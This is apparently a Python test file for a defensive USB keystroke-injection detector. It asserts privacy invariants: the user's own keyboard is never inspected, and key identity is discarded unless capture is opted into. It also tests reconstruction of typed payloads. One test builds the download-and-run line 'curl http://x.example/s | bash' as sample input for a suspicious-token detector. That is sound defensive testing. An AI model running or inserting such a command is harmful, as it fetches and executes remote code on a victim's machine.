"""
Payload reconstruction, and the privacy invariants SECURITY.md rests on.

SECURITY.md, "Keystroke capture and privacy", states three constraints and
says: "Points 1-3 are asserted in `tests/test_payload.py` and
`tests/test_safety.py`."

`tests/test_safety.py` existed. This file did not. A security policy that
cites a regression test which is not in the tree is asserting nothing -- and
the invariants it names are the ones that decide whether this tool can record
what somebody typed. They are asserted here now:

  1. devices attached before startup go into a baseline and are never
     inspected, so your own keyboard is never a candidate;
  2. quarantine runs strictly BEFORE the human decision, and the grab is
     released and never retaken once a device is authorized;
  3. key identity is discarded unless --capture-payload was passed, so the
     default configuration cannot reconstruct text even in memory.

The rest of the module covers the reconstruction itself, which is what turns
a captured payload into an incident-response artifact rather than a count.
"""

from __future__ import annotations

import unittest
from unittest import mock

from probolos import daemon, payload, quarantine


# ---------------------------------------------------------------------------
# 3. Key identity is discarded unless capture was requested
# ---------------------------------------------------------------------------

class DefaultConfigurationRecordsNoKeyIdentity(unittest.TestCase):

    def _observe(self, capture):
        obs = quarantine.Observation(capture=capture)
        for code in (30, 31, 32):        # a, s, d
            quarantine._record_event(quarantine.EV_KEY, code, 1, obs, 0.0)
        return obs

    def test_a_keypress_carries_a_timestamp_and_nothing_else(self):
        obs = self._observe(capture=False)
        self.assertEqual(len(obs.key_presses), 3)
        for press in obs.key_presses:
            self.assertIsNone(
                press.code,
                "the default configuration recorded WHICH key was pressed")

    def test_no_raw_event_stream_is_kept_without_capture(self):
        self.assertEqual(self._observe(capture=False).raw_events, [])

    def test_nothing_can_be_reconstructed_without_capture(self):
        self.assertIsNone(
            payload.reconstruct_observation(self._observe(capture=False)))

    def test_timing_analysis_still_works_without_capture(self):
        """
        The constraint must not be bought by disabling the stage. Timestamps
        alone are what the behavioural rules read.
        """
        obs = self._observe(capture=False)
        self.assertEqual(len(obs.intervals()), 2)
        self.assertIsNotNone(obs.time_to_first_key())

    def test_capture_is_opt_in_and_then_records_the_keys(self):
        obs = self._observe(capture=True)
        self.assertEqual([p.code for p in obs.key_presses], [30, 31, 32])
        recovered = payload.reconstruct_observation(obs)
        self.assertIsNotNone(recovered)
        self.assertEqual(recovered.text, "asd")

    def test_capture_is_off_unless_the_flag_is_given(self):
        """
        The default is the invariant, so it is read off the real parser rather
        than off the help text, which wraps.
        """
        from probolos import __main__ as entry
        with mock.patch.object(entry, "require_usb"), \
             mock.patch.object(entry, "require_root"), \
             mock.patch.object(entry.daemon, "serve") as serve, \
             mock.patch.object(entry.sys, "stdout", new=mock.Mock()):
            entry.main(["--dry-run", "--no-ledger", "--no-trust"])
        self.assertIs(serve.call_args.kwargs["capture_payload"], False)

    def test_the_daemon_defaults_to_not_capturing(self):
        self.assertFalse(daemon.Probolos().capture_payload)


# ---------------------------------------------------------------------------
# 1. Devices present at startup are baseline and never inspected
# ---------------------------------------------------------------------------

class BaselineDevicesAreNeverInspected(unittest.TestCase):

    def test_a_device_in_the_baseline_is_dropped_before_anything_reads_it(self):
        engine = daemon.Probolos(observe=3.0, capture_payload=True)
        engine.known.add("1-4")
        with mock.patch.object(daemon.Probolos, "_load_with_retry") as load, \
             mock.patch.object(daemon.Probolos, "_quarantine") as quarantined:
            engine._on_add("/sys/bus/usb/devices/1-4")
        load.assert_not_called()
        quarantined.assert_not_called()

    def test_snapshot_puts_every_live_device_in_the_baseline(self):
        live = mock.Mock(name="live", authorized=1, is_root_hub=False)
        live.name = "1-4"
        with mock.patch.object(daemon.sysfs, "list_devices",
                               return_value=[live]):
            engine = daemon.Probolos()
            engine.snapshot()
        self.assertIn("1-4", engine.known)
        self.assertEqual(engine.pending, {})


# ---------------------------------------------------------------------------
# 2. Quarantine runs before the decision, and the grab is never retaken
# ---------------------------------------------------------------------------

class QuarantineRunsOnlyBeforeTheDecision(unittest.TestCase):

    def test_the_device_is_re_blocked_before_any_grab_is_released(self):
        """
        Ordering, not merely presence: releasing first would leave a window in
        which the device is live and ungrabbed, which is the one state in
        which it could type into the session it was being observed for.
        """
        import inspect
        source = inspect.getsource(quarantine.quarantine)
        deauthorize = source.index("deauthorize()")
        ungrab = source.index("_ungrab(fd)")
        self.assertLess(deauthorize, ungrab)

    def test_an_authorized_device_is_never_offered_to_the_quarantine(self):
        """
        _on_add returns at the baseline check for anything already admitted,
        and admission adds the device to that baseline. So there is no route
        from "authorized" back into _quarantine.
        """
        engine = daemon.Probolos(observe=3.0, capture_payload=True)
        engine.known.add("1-4")
        with mock.patch.object(daemon.Probolos, "_quarantine") as quarantined:
            engine._on_add("/sys/bus/usb/devices/1-4")
        quarantined.assert_not_called()

    def test_observe_zero_disables_the_stage_entirely(self):
        engine = daemon.Probolos(observe=0.0)
        self.assertEqual(engine.observe, 0.0)


# ---------------------------------------------------------------------------
# Reconstruction itself
# ---------------------------------------------------------------------------

def _press(code, offset=0.0):
    return (offset, code, 1)


def _release(code, offset=0.0):
    return (offset, code, 0)


class Reconstruction(unittest.TestCase):

    def test_a_shifted_run_reads_as_typed(self):
        events = [_press(payload.MOD_LEFTSHIFT), _press(35), _press(23),
                  _release(payload.MOD_LEFTSHIFT), _press(23)]
        self.assertEqual(payload.reconstruct(events).text, "HIi")

    def test_a_chord_becomes_an_action_line(self):
        events = [_press(payload.MOD_LEFTMETA), _press(19),
                  _release(payload.MOD_LEFTMETA)]
        self.assertEqual(payload.reconstruct(events).lines, ["GUI R"])

    def test_auto_repeat_is_not_counted_as_a_second_keystroke(self):
        events = [_press(30), (0.0, 30, 2), (0.0, 30, 2)]
        self.assertEqual(payload.reconstruct(events).keystrokes, 1)

    def test_the_character_cap_cannot_be_reset_by_pressing_enter(self):
        """
        The bound compared max_chars against a buffer that flush() emptied, so
        a payload typing a newline every few characters never reached it.
        """
        events = []
        for _ in range(500):
            events += [_press(30), _press(31), _press(28)]   # "as" ENTER
        recovered = payload.reconstruct(events, max_chars=64)
        self.assertTrue(recovered.truncated)
        self.assertLess(len(recovered.as_script()), 4096)

    def test_the_keystroke_count_survives_truncation(self):
        events = [_press(30)] * 200
        recovered = payload.reconstruct(events, max_chars=8)
        self.assertEqual(recovered.keystrokes, 200)
        self.assertTrue(recovered.truncated)

    def test_a_download_and_run_payload_is_named_as_one(self):
        text = "curl http://x.example/s | bash"
        codes = {c: k for k, (c, _s) in payload.KEYMAP.items()}
        events = [_press(codes[ch]) for ch in text if ch in codes]
        tokens = payload.reconstruct(events).suspicious_tokens()
        self.assertIn("curl", tokens)
        self.assertIn("bash", tokens)

    def test_an_unmapped_code_is_reported_rather_than_dropped(self):
        self.assertEqual(payload.reconstruct([_press(200)]).lines, ["KEY_200"])


if __name__ == "__main__":
    unittest.main()
